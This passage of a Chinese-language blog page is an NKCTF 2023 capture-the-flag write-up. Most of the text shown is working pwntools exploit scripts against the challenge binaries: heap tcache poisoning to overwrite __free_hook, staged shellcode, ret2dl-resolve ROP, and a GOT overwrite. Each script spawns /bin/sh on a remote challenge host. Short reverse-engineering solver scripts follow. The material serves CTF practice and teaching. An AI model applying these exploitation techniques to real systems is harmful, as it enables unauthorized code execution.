function_">calc_fd</span>(<span class="hljs-params">c,off</span>):<br>    off1=off<br>    off=off<br>    h=<span class="hljs-built_in">hex</span>(c)[<span class="hljs-number">2</span>:].strip(<span class="hljs-string">&#x27;L&#x27;</span>)[::-<span class="hljs-number">1</span>]<br>    e=[]<br>    <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">0</span>,<span class="hljs-built_in">len</span>(h),<span class="hljs-number">3</span>):<br>        e.append(h[i:i+<span class="hljs-number">3</span>][::-<span class="hljs-number">1</span>])<br>    uh=[]<br>    xc=<span class="hljs-number">0</span><br>    <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> e:<br>        hc=<span class="hljs-built_in">int</span>(i,<span class="hljs-number">16</span>)^(xc+(off&amp;<span class="hljs-number">0xfff</span>))<br>        xc=hc<br>        off=off&gt;&gt;<span class="hljs-number">12</span><br>        uh.append(<span class="hljs-built_in">hex</span>(hc)[<span class="hljs-number">2</span>:].strip(<span class="hljs-string">&#x27;L&#x27;</span>).zfill(<span class="hljs-number">3</span>))<br>    heap_len=<span class="hljs-built_in">len</span>(h)-<span class="hljs-number">3</span><br>    uh=<span class="hljs-string">&#x27;&#x27;</span>.join(uh[::-<span class="hljs-number">1</span>])[-heap_len:]+<span class="hljs-string">&#x27;000&#x27;</span><br>    fd=<span class="hljs-built_in">int</span>(uh,<span class="hljs-number">16</span>)+off1<br>    <span class="hljs-keyword">return</span> fd<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">enc_fd</span>(<span class="hljs-params">fd,next_</span>):<br>    <span class="hljs-keyword">return</span> (fd&gt;&gt;<span class="hljs-number">12</span>)^next_<br><br><br><span class="hljs-comment">#p=process(&#x27;./pwn&#x27;)</span><br>p=remote(<span class="hljs-string">&#x27;node2.yuzhian.com.cn&#x27;</span>,<span class="hljs-string">&#x27;32973&#x27;</span>)<br><br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">9</span>):<br>    add(i,<span class="hljs-number">0x88</span>)<br><br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">8</span>):<br>    free(i)<br><br><span class="hljs-comment">#gdb.attach(p)</span><br><span class="hljs-comment">#pause()</span><br><br>add(<span class="hljs-number">7</span>,<span class="hljs-number">0x48</span>)<br>edit(<span class="hljs-number">7</span>,<span class="hljs-string">b&#x27;\n&#x27;</span>)<br>show(<span class="hljs-number">7</span>)<br><br>pause()<br>d=u64(p.read(<span class="hljs-number">6</span>).ljust(<span class="hljs-number">8</span>,<span class="hljs-string">b&#x27;\x00&#x27;</span>))&amp;<span class="hljs-number">0xffffffffffffff00</span><br>main_area=d-<span class="hljs-number">0x60</span><br><span class="hljs-built_in">print</span>(<span class="hljs-built_in">hex</span>(d))<br>malloc_hook=main_area-<span class="hljs-number">0x10</span><br>libc.address=malloc_hook-libc.sym[<span class="hljs-string">&#x27;__malloc_hook&#x27;</span>]<br>free_hook=libc.sym[<span class="hljs-string">&#x27;__free_hook&#x27;</span>]<br>system=libc.sym[<span class="hljs-string">&#x27;system&#x27;</span>]<br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">7</span>):<br>    add(<span class="hljs-number">6</span>-i,<span class="hljs-number">0x88</span>)<br>show(<span class="hljs-number">1</span>)<br><br>heap_1_c=u64(p.readuntil(<span class="hljs-string">&#x27;\n&#x27;</span>,drop=<span class="hljs-number">1</span>).ljust(<span class="hljs-number">8</span>,<span class="hljs-string">b&#x27;\x00&#x27;</span>))<br>heap=calc_fd(heap_1_c,<span class="hljs-number">0x2a0</span>)<br><span class="hljs-built_in">print</span>(<span class="hljs-built_in">hex</span>(heap))<br>pause()<br><br>pad=<span class="hljs-string">b&#x27;\x00&#x27;</span>*<span class="hljs-number">0x58</span>+p64(<span class="hljs-number">0x91</span>)+<span class="hljs-string">b&#x27;\n&#x27;</span><br>edit(<span class="hljs-number">1</span>,pad)<br>edit(<span class="hljs-number">2</span>,pad)<br>edit(<span class="hljs-number">3</span>,pad)<br><br>pad1=<span class="hljs-string">b&#x27;\x00&#x27;</span>*<span class="hljs-number">0x88</span>+<span class="hljs-string">b&#x27;\xf1&#x27;</span><br>edit(<span class="hljs-number">0</span>,pad1)<br>free(<span class="hljs-number">1</span>)<br><br>add(<span class="hljs-number">1</span>,<span class="hljs-number">0xe8</span>)<br>free(<span class="hljs-number">3</span>)<br>free(<span class="hljs-number">2</span>)<br><br>payload=<span class="hljs-string">b&#x27;\x00&#x27;</span>*<span class="hljs-number">0x88</span>+p64(<span class="hljs-number">0x91</span>)+p64(enc_fd(heap+<span class="hljs-number">0x290</span>+<span class="hljs-number">0x90</span>+<span class="hljs-number">0x90</span>+<span class="hljs-number">0x10</span>,free_hook))+<span class="hljs-string">b&#x27;\n&#x27;</span><br>edit(<span class="hljs-number">1</span>,payload)<br><br>edit(<span class="hljs-number">0</span>,<span class="hljs-string">b&#x27;/bin/sh\x00\n&#x27;</span>)<br><br>add(<span class="hljs-number">2</span>,<span class="hljs-number">0x88</span>)<br>add(<span class="hljs-number">3</span>,<span class="hljs-number">0x88</span>)<br>edit(<span class="hljs-number">3</span>,p64(system)+<span class="hljs-string">b&#x27;\n&#x27;</span>)<br>free(<span class="hljs-number">0</span>)<br><br><br><br>p.interactive()<br></code></pre></td></tr></table></figure>
+
+<h2 id="9961code"><a href="#9961code" class="headerlink" title="9961code"></a>9961code</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br>context.arch=<span class="hljs-string">&#x27;amd64&#x27;</span><br><br>sh=<span class="hljs-string">&quot;&quot;&quot;</span><br><span class="hljs-string">syscall</span><br><span class="hljs-string">mov rdi,r15</span><br><span class="hljs-string">and esi,edi</span><br><span class="hljs-string">mov dx,0xf</span><br><span class="hljs-string">add eax,0x30</span><br><span class="hljs-string">syscall</span><br><span class="hljs-string">mov esi,edi</span><br><span class="hljs-string">xor edi,edi</span><br><span class="hljs-string">jmp rsi</span><br><span class="hljs-string">&quot;&quot;&quot;</span><br><br>sh1=<span class="hljs-string">&quot;&quot;&quot;</span><br><span class="hljs-string">syscall</span><br><span class="hljs-string">add edx,0x30</span><br><span class="hljs-string">mov ax,0</span><br><span class="hljs-string">jmp rsi</span><br><span class="hljs-string">&quot;&quot;&quot;</span><br><br>sh2=<span class="hljs-string">&quot;&quot;&quot;</span><br><span class="hljs-string">    syscall</span><br><span class="hljs-string">    mov edi,0x9961020</span><br><span class="hljs-string">    xor rsi,rsi</span><br><span class="hljs-string">    xor rdx,rdx</span><br><span class="hljs-string">    mov ax,0x3b</span><br><span class="hljs-string">    syscall&quot;&quot;&quot;</span><br><br><br><br><span class="hljs-built_in">print</span>(<span class="hljs-built_in">len</span>(asm(sh)))<br><span class="hljs-comment">#p=process(&#x27;./pwn&#x27;)</span><br>p=remote(<span class="hljs-string">&quot;node2.yuzhian.com.cn:32041&quot;</span>)<br><span class="hljs-comment">#gdb.attach(p,&#x27;bp main+294&#x27;)</span><br><span class="hljs-comment">#p=remote(&quot;node2.yuzhian.com.cn:30693&quot;)</span><br>pause()<br>p.sendafter(<span class="hljs-string">&#x27;shellcode&#x27;</span>,asm(sh))<br>pause()<br>p.sendline(asm(sh1))<br>pause()<br>p.sendline(asm(sh2).ljust(<span class="hljs-number">0x20</span>,<span class="hljs-string">b&#x27;\x90&#x27;</span>)+<span class="hljs-string">b&#x27;/bin/sh\x00&#x27;</span>)<br>p.interactive()<br></code></pre></td></tr></table></figure>
+
+
+<h2 id="only-read"><a href="#only-read" class="headerlink" title="only_read"></a>only_read</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br><span class="hljs-keyword">import</span> base64<br><br>e=ELF(<span class="hljs-string">&#x27;./pwn&#x27;</span>)<br>read=<span class="hljs-number">0x4013d0</span><br>leave=<span class="hljs-number">0x4013e7</span><br>ret=<span class="hljs-number">0x4013e8</span><br><span class="hljs-keyword">from</span> mcrypt <span class="hljs-keyword">import</span> *<br><br><br>c=[<span class="hljs-string">b&quot;Welcome to NKCTF!\x00&quot;</span>,\<br>        <span class="hljs-string">b&quot;tell you a secret:\x00&quot;</span>,\<br>        <span class="hljs-string">b&quot;I&#x27;M RUNNING ON GLIBC 2.31-0ubuntu9.9\x00&quot;</span>,\<br>        <span class="hljs-string">b&quot;can you find me?\x00&quot;</span>]<br><br><span class="hljs-comment">#p=process(&#x27;./pwn&#x27;)</span><br>p=remote(<span class="hljs-string">&quot;node2.yuzhian.com.cn:31146&quot;</span>)<br>base=b64()<br>base.setbase(<span class="hljs-string">&quot;ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/&quot;</span>)<br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> c:<br>    <span class="hljs-built_in">print</span>(i)<br>    p.sendline(base.encode(i))<br>    pause()<br><br>rel=<span class="hljs-number">0x4005d8</span><br><span class="hljs-comment">#str_t=0x3ff388</span><br><span class="hljs-comment">#sym=0x3ff420</span><br>sym=<span class="hljs-number">0x4003d0</span><br>str_t=<span class="hljs-number">0x4004c0</span><br>bss=<span class="hljs-number">0x404900</span>+<span class="hljs-number">0xc0</span>*<span class="hljs-number">8</span>+<span class="hljs-number">0x40</span>+<span class="hljs-number">0x20</span><br><span class="hljs-built_in">print</span>(<span class="hljs-built_in">hex</span>(bss))<br>sym_ind=<span class="hljs-number">905</span><br>func_got=e.got[<span class="hljs-string">&#x27;memset&#x27;</span>]<br><br>rdi=<span class="hljs-number">0x00401683</span><br>rel_add=bss+<span class="hljs-number">6</span>*<span class="hljs-number">0x8</span>+<span class="hljs-number">0x18</span><br>sym_add=bss+<span class="hljs-number">6</span>*<span class="hljs-number">0x8</span><br><span class="hljs-built_in">print</span>(<span class="hljs-built_in">hex</span>(rel_add))<br><br>gogo=<span class="hljs-number">0x401039</span><br><span class="hljs-comment">#p.interactive()</span><br><br>pad=<span class="hljs-string">b&#x27;\x00&#x27;</span>*<span class="hljs-number">0x10</span><br>pad_n=<span class="hljs-number">3</span><br>bin_sh=bss<br>system=bss+<span class="hljs-number">0x28</span><br>str_=<span class="hljs-string">b&#x27;/bin/sh\x00\x00system\x00&#x27;</span><br>sym_=p32(system-str_t)+p64(<span class="hljs-number">12</span>)+p32(<span class="hljs-number">0</span>)*<span class="hljs-number">3</span><br>rel_=p64(bss-<span class="hljs-number">0x30</span>)+p32(<span class="hljs-number">7</span>)+p32((sym_add-sym)//<span class="hljs-number">0x18</span>)+p32(<span class="hljs-number">0</span>)*<span class="hljs-number">2</span><br><br><span class="hljs-comment">#gdb.attach(p,&#x27;bp 0x401039&#x27;)</span><br><span class="hljs-comment">#pause()</span><br><span class="hljs-built_in">print</span>(<span class="hljs-built_in">hex</span>(rel_add-rel))<br><br><br><br>payload2=<span class="hljs-string">b&#x27;\x00&#x27;</span>*<span class="hljs-number">0x30</span><br>payload2+=<span class="hljs-string">b&quot;/bin/sh\x00&quot;</span>+p64(rdi)+p64(bin_sh)+p64(gogo)+p64((rel_add-rel)//<span class="hljs-number">0x18</span>+<span class="hljs-number">1</span>)<br>payload2+=<span class="hljs-string">b&quot;system\x00\x00&quot;</span><br>payload2+=sym_+p64(<span class="hljs-number">0</span>)*<span class="hljs-number">2</span>+rel_<br><br><br>payload=<span class="hljs-string">b&#x27;a&#x27;</span>*<span class="hljs-number">0x30</span>+p64(bss)+p64(read)<br>p.sendline(payload)<br>pause()<br><br>p.sendline(payload2)<br><br>p.interactive()<br></code></pre></td></tr></table></figure>
+
+<h2 id="note"><a href="#note" class="headerlink" title="note"></a>note</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">add</span>(<span class="hljs-params">ind,size,data=<span class="hljs-string">&quot; &quot;</span></span>):<br>    p.sendlineafter(<span class="hljs-string">&quot;choice: &quot;</span>,<span class="hljs-string">&#x27;1&#x27;</span>)<br>    p.sendlineafter(<span class="hljs-string">&#x27;Index: &#x27;</span>,<span class="hljs-built_in">str</span>(ind))<br>    p.sendlineafter(<span class="hljs-string">&#x27;Size: &#x27;</span>,<span class="hljs-built_in">str</span>(size))<br>    p.sendafter(<span class="hljs-string">&quot;Content: &quot;</span>,data)<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">edit</span>(<span class="hljs-params">ind,data</span>):<br>    p.sendlineafter(<span class="hljs-string">&quot;choice: &quot;</span>,<span class="hljs-string">&#x27;2&#x27;</span>)<br>    p.sendlineafter(<span class="hljs-string">&#x27;Index: &#x27;</span>,<span class="hljs-built_in">str</span>(ind))<br>    p.sendlineafter(<span class="hljs-string">&#x27;Size: &#x27;</span>,<span class="hljs-built_in">str</span>(<span class="hljs-built_in">len</span>(data)))<br>    p.sendafter(<span class="hljs-string">&quot;Content: &quot;</span>,data)<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">free</span>(<span class="hljs-params">ind</span>):<br>    p.sendlineafter(<span class="hljs-string">&quot;choice: &quot;</span>,<span class="hljs-string">&#x27;3&#x27;</span>)<br>    p.sendlineafter(<span class="hljs-string">&#x27;Index: &#x27;</span>,<span class="hljs-built_in">str</span>(ind))<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">show</span>(<span class="hljs-params">ind</span>):<br>    p.sendlineafter(<span class="hljs-string">&quot;choice: &quot;</span>,<span class="hljs-string">&#x27;4&#x27;</span>)<br>    p.sendlineafter(<span class="hljs-string">&#x27;Index: &#x27;</span>,<span class="hljs-built_in">str</span>(ind))<br><br><br><br><br>e=ELF(<span class="hljs-string">&#x27;./nk_note&#x27;</span>)<br>context.binary=e<br>libc=ELF(<span class="hljs-string">&#x27;./libc.so&#x27;</span>)<br><br>p=remote(<span class="hljs-string">&quot;node2.yuzhian.com.cn:30946&quot;</span>)<br><span class="hljs-comment">#p=process(&quot;./nk_note&quot;)</span><br><span class="hljs-comment">#gdb.attach(p)</span><br>context.log_level=<span class="hljs-string">&#x27;debug&#x27;</span><br>show(<span class="hljs-number">16</span>)<br>d=u64(p.readuntil(<span class="hljs-string">&#x27;\n&#x27;</span>,drop=<span class="hljs-number">1</span>).ljust(<span class="hljs-number">8</span>,<span class="hljs-string">b&#x27;\x00&#x27;</span>))<br><span class="hljs-built_in">print</span>(<span class="hljs-built_in">hex</span>(d))<br>pause()<br>add(<span class="hljs-number">0</span>,<span class="hljs-number">0x500</span>,<span class="hljs-string">&quot;/bin/sh\x00&quot;</span>)<br>add(<span class="hljs-number">1</span>,<span class="hljs-number">0x300</span>)<br>add(<span class="hljs-number">2</span>,<span class="hljs-number">0x100</span>)<br>add(<span class="hljs-number">3</span>,<span class="hljs-number">0x80</span>)<br>add(<span class="hljs-number">4</span>,<span class="hljs-number">0x40</span>)<br>add(<span class="hljs-number">5</span>,<span class="hljs-number">0x20</span>)<br>payload=<span class="hljs-string">b&#x27;a&#x27;</span>*<span class="hljs-number">0x10</span><br>edit(<span class="hljs-number">16</span>,payload)<br>show(<span class="hljs-number">16</span>)<br>p.readuntil(<span class="hljs-string">&#x27;a&#x27;</span>*<span class="hljs-number">0x10</span>)<br>d1=u64(p.readuntil(<span class="hljs-string">&#x27;\n&#x27;</span>,drop=<span class="hljs-number">1</span>).ljust(<span class="hljs-number">8</span>,<span class="hljs-string">b&#x27;\x00&#x27;</span>))<br><span class="hljs-built_in">print</span>(<span class="hljs-built_in">hex</span>(d1))<br>e.address=d1-<span class="hljs-number">0x4120</span><br><br>func=<span class="hljs-string">&#x27;puts&#x27;</span><br>func_got=e.got[func]<br><br><br>l=[]<br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">0x6B</span>):<br>    payload=<span class="hljs-string">&#x27;a&#x27;</span>*i*<span class="hljs-number">8</span><br>    edit(<span class="hljs-number">16</span>,payload)<br>    show(<span class="hljs-number">16</span>)<br>    data=p.readuntil(<span class="hljs-string">&#x27;\n&#x27;</span>,drop=<span class="hljs-number">1</span>).strip(<span class="hljs-string">b&#x27;a&#x27;</span>).ljust(<span class="hljs-number">8</span>,<span class="hljs-string">b&#x27;\x00&#x27;</span>)<br>    dn=u64(data)<br>    l.append(dn)<br><br><span class="hljs-built_in">print</span>(l)<br>pause()<br>payload=flat(l)+p64(e.address+<span class="hljs-number">0x4150</span>)<br>edit(<span class="hljs-number">16</span>,payload)<br>ind=<span class="hljs-number">0x26</span><br><span class="hljs-built_in">print</span>(<span class="hljs-built_in">hex</span>(e.address))<br><br>add(<span class="hljs-number">5</span>,<span class="hljs-number">0x40</span>)<br><br>edit(<span class="hljs-number">5</span>,p64(func_got))<br>show(ind)<br>dd=u64(p.readuntil(<span class="hljs-string">&#x27;\n&#x27;</span>,drop=<span class="hljs-number">1</span>).ljust(<span class="hljs-number">8</span>,<span class="hljs-string">b&#x27;\x00&#x27;</span>))<br><span class="hljs-built_in">print</span>(<span class="hljs-built_in">hex</span>(dd))<br>libc.address=dd-libc.sym[func]<br><span class="hljs-built_in">print</span>(<span class="hljs-built_in">hex</span>(libc.address))<br>system=libc.sym[<span class="hljs-string">&#x27;system&#x27;</span>]<br><span class="hljs-built_in">print</span>(<span class="hljs-built_in">hex</span>(e.got[<span class="hljs-string">&#x27;free&#x27;</span>]))<br>edit(<span class="hljs-number">5</span>,p64(e.got[<span class="hljs-string">&#x27;free&#x27;</span>]))<br>edit(ind,p64(system))<br>free(<span class="hljs-number">0</span>)<br>p.interactive()<br></code></pre></td></tr></table></figure>
+
+
+<h1 id="reverse"><a href="#reverse" class="headerlink" title="reverse"></a>reverse</h1><h2 id="ez-baby-apk"><a href="#ez-baby-apk" class="headerlink" title="ez_baby_apk"></a>ez_baby_apk</h2><p>使用jadx加雷电模拟器进行调试</p>
+<p><img src="https://lewiserii.oss-cn-hangzhou.aliyuncs.com/nkctf2023/ez_baby_apk-1.png"></p>
+<p><img src="https://lewiserii.oss-cn-hangzhou.aliyuncs.com/nkctf2023/ez_baby_apk-2.png"></p>
+<p><img src="https://lewiserii.oss-cn-hangzhou.aliyuncs.com/nkctf2023/ez_baby_apk-3.png"></p>
+<h2 id="PMKF"><a href="#PMKF" class="headerlink" title="PMKF"></a>PMKF</h2><p><img src="https://lewiserii.oss-cn-hangzhou.aliyuncs.com/nkctf2023/PMKF-1.jpg"></p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs python">a=[<span class="hljs-string">&quot;1122&quot;</span>,<span class="hljs-string">&quot;3322&quot;</span>,<span class="hljs-string">&quot;1223&quot;</span>,<span class="hljs-string">&quot;2211&quot;</span>,<span class="hljs-string">&quot;0111&quot;</span>,<span class="hljs-string">&quot;1101&quot;</span>,<span class="hljs-string">&quot;0000&quot;</span>,<span class="hljs-string">&quot;0101&quot;</span>,<span class="hljs-string">&quot;1211&quot;</span>,<span class="hljs-string">&quot;0111&quot;</span>,<span class="hljs-string">&quot;2223&quot;</span>,<span class="hljs-string">&quot;2330&quot;</span>,<span class="hljs-string">&quot;3323&quot;</span>,<span class="hljs-string">&quot;2211&quot;</span>,<span class="hljs-string">&quot;1112&quot;</span>,<span class="hljs-string">&quot;2333&quot;</span>]<br>e=[]<br>k=<span class="hljs-string">b&#x27;nkman&#x27;</span><br>k1=<span class="hljs-number">0</span><br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> k:<br>    k1+=i<br>k1=k1&amp;<span class="hljs-number">0xff</span><br><span class="hljs-built_in">print</span>(k1)<br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> a:<br>    c=<span class="hljs-string">&#x27;&#x27;</span><br>    <span class="hljs-keyword">for</span> j <span class="hljs-keyword">in</span> i:<br>        c+=<span class="hljs-built_in">bin</span>(<span class="hljs-built_in">int</span>(j))[<span class="hljs-number">2</span>:].zfill(<span class="hljs-number">2</span>)<br>    e.append(<span class="hljs-built_in">int</span>(c,<span class="hljs-number">2</span>)^k1)<br><span class="hljs-built_in">print</span>((<span class="hljs-string">b&#x27;\x05&#x27;</span>+<span class="hljs-string">b&#x27;nkman&#x27;</span>+<span class="hljs-built_in">bytes</span>(e)).<span class="hljs-built_in">hex</span>())<br></code></pre></td></tr></table></figure>
+
+<h2 id="babyrust"><a href="#babyrust" class="headerlink" title="babyrust"></a>babyrust</h2><p><img src="https://lewiserii.oss-cn-hangzhou.aliyuncs.com/nkctf2023/babyrust-1.jpg"></p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs python">a=<span class="hljs-string">b&quot;)&amp;n_qFb&#x27;NZXpj)*bLDmLnVj]@^_H&quot;</span><br>e=[]<br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> a:<br>    d=(i-<span class="hljs-number">0x28</span>+<span class="hljs-number">45</span>)^<span class="hljs-number">0x30</span><br>    <span class="hljs-keyword">if</span> d&lt;<span class="hljs-number">0x20</span>:<br>        d=d+<span class="hljs-number">48</span><br>    e.append(d)<br><span class="hljs-built_in">print</span>(<span class="hljs-built_in">bytes</span>(e))<br></code></pre></td></tr></table></figure>
+              
+            </div>
+            <hr/>
+            <div>
+              <div class="post-metas my-3">
+  
+    <div class="post-meta mr-3 d-flex align-items-center">
+      <i class="iconfont icon-category"></i>
+      
+
+<span class="category-chains">
+  
+  
+    
+      <span class="category-chain">
+        
+  <a href="/categories/wp/" class="category-chain-item">wp</a>
+  
+  
+
+      </span>
+    
+  
+</span>
+
+    </div>
+  
+  
+    <div class="post-meta">
+      <i class="iconfont icon-tags"></i>
+      
+        <a href="/tags/wp/">#wp</a>
+      
+        <a href="/tags/nkctf/">#nkctf</a>
+      
+    </div>
+  
+</div>
+
+
+              
+  
+
+  <div class="license-box my-3">
+    <div class="license-title">
+      <div>2023NKCTF-wp</div>
+      <div>https://www.lewiserii.top/wp/NKCTF2023.html</div>
+    </div>
+    <div class="license-meta">
+      
+        <div class="license-meta-item">
+          <div>作者</div>
+          <div>lewiserii</div>
+        </div>
+      
+      
+        <div class="license-meta-item license-meta-date">
+          <div>发布于</div>
+          <div>2023年3月26日</div>
+        </div>
+      
+      
+      <div class="license-meta-item">
+        <div>许可协议</div>
+        <div>
+          
+            
+            
+              <a target="_blank" href="https://creativecommons.org/licenses/by-nc-nd/4.0/">
+              <span class="hint--top hint--rounded" aria-label="BY - 署名">
+                <i class="iconfont icon-by"></i>
+              </span>
+              </a>
+            
+              <a target="_blank" href="https://creativecommons.org/licenses/by-nc-nd/4.0/">
+              <span class="hint--top hint--rounded" aria-label="NC - 非商业性使用">
+                <i class="iconfont icon-nc"></i>
+              </span>
+              </a>
+            
+              <a target="_blank" href="https://creativecommons.org/licenses/by-nc-nd/4.0/">
+              <span class="hint--top hint--rounded" aria-label="ND - 禁止演绎">
+                <i class="iconfont icon-nd"></i>
+              </span>
+              </a>
+            
+          
+        </div>
+      </div>
+    </div>
+    <div class="license-icon iconfont"></div>
+  </div>
+
+
+
+              
+                <div class="post-prevnext my-3">
+                  <article class="post-prev col-6">
+                    
+                    
+                  </article>
+                  <article class="post-next col-6">
+                    
+                    
+                      <a href="/%E5%85%B6%E4%BB%96/auto_deploy.html" title="auto_deploy.sh">
+                        <span class="hidden-mobile">auto_deploy.sh</span>
+                        <span class="visible-mobile">下一篇</span>
+                        <i class="iconfont icon-arrowright"></i>
+                      </a>
+                    
+                  </article>
+                </div>
+              
+            </div>
+
+            
+  <article id="comments">
+    
+  <div id="waline"></div>
+  <script type="text/javascript">
+    Fluid.utils.loadComments('#waline', function() {
+      Fluid.utils.createCssLink('https://lib.baomitu.com/waline/2.5.1/waline.min.css')
+      Fluid.utils.createScript('https://lib.baomitu.com/waline/2.5.1/waline.min.js', function() {
+        var options = Object.assign(
+          {"serverURL":"https://waline.lewiserii.top/","path":"window.location.pathname","meta":["nick","mail","link"],"requiredMeta":["nick"],"lang":"zh-CN","emoji":["//unpkg.com/@waline/emojis@1.0.1/qq","//unpkg.com/@waline/emojis@1.0.1/bilibili"],"dark":"html[data-user-color-scheme=\"dark\"]","wordLimit":0,"pageSize":10},
+          {
+            el: '#waline',
+            path: window.location.pathname
+          }
+        )
+        Waline.init(options);
+        Fluid.utils.waitElementVisible('#waline .vcontent', () => {
+          var imgSelector = '#waline .vcontent img:not(.vemoji)';
+          Fluid.plugins.imageCaption(imgSelector);
+          Fluid.plugins.fancyBox(imgSelector);
+        })
+      });
+    });
+  </script>
